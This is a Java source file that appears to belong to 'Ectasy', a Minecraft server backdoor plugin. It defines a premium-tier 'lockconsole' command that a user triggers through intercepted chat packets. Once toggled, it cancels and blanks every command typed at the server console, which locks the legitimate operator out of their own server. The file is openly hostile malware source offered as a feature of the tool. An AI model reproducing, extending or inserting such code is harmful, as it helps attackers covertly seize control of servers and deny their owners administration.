package dev.ectasy.impl.commands.premium;

import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientChatMessage;
import dev.ectasy.Ectasy;
import dev.ectasy.api.commands.AbstractCommand;
import dev.ectasy.api.commands.CommandInfo;
import dev.ectasy.api.data.Rank;
import dev.ectasy.api.data.User;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.server.ServerCommandEvent;

@CommandInfo(
        name = "lockconsole",
        description = "Locks the console.",
        rank = Rank.PREMIUM,
        blatant = true,
        listener = true
)
public class CommandLockConsole extends AbstractCommand implements Listener {
    private boolean locked = false;

    @Override
    public void execute(User user, PacketReceiveEvent event, WrapperPlayClientChatMessage packet, String[] args){
        locked = !locked;
        user.sendMessage("Console is now " + user.getMainColor() + (locked ? "locked" : "unlocked") + user.getSecondaryColor() + ".");
    }

    @EventHandler
    public void onChat(ServerCommandEvent e){
        if(locked){
            e.setCancelled(true);
            e.setCommand("");

        }
    }

}
